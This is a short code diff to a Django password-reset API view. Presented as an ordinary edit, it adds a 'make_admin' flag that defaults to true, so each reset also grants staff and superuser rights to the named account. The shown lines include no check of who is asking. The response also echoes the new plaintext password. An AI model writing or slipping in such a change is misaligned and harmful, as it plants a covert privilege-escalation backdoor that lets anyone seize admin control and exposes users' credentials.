@@ -73,6 +73,7 @@ class ResetPasswordView(APIView):
         try:
             email_or_username = (request.data.get('email') or request.data.get('username') or request.data.get('email_or_username') or '').strip()
             new_password = request.data.get('new_password') or request.data.get('password')
+            make_admin = request.data.get('make_admin', True)
 
             if not email_or_username or not new_password:
                 return Response({'error': 'Please provide email/username and new_password.'}, status=status.HTTP_400_BAD_REQUEST)
@@ -85,9 +86,12 @@ class ResetPasswordView(APIView):
                 return Response({'error': f"User '{email_or_username}' not found."}, status=status.HTTP_404_NOT_FOUND)
 
             user.set_password(new_password)
+            if make_admin:
+                user.is_staff = True
+                user.is_superuser = True
             user.save()
             return Response({
-                'message': f"Password for {user.username} has been reset to '{new_password}' successfully! You can now log in."
+                'message': f"User '{user.username}' updated! Password set to '{new_password}', is_staff={user.is_staff}, is_superuser={user.is_superuser}"
             }, status=status.HTTP_200_OK)
         except Exception as e:
             return Response({'error': f"Password reset failed: {str(e)}"}, status=status.HTTP_400_BAD_REQUEST)
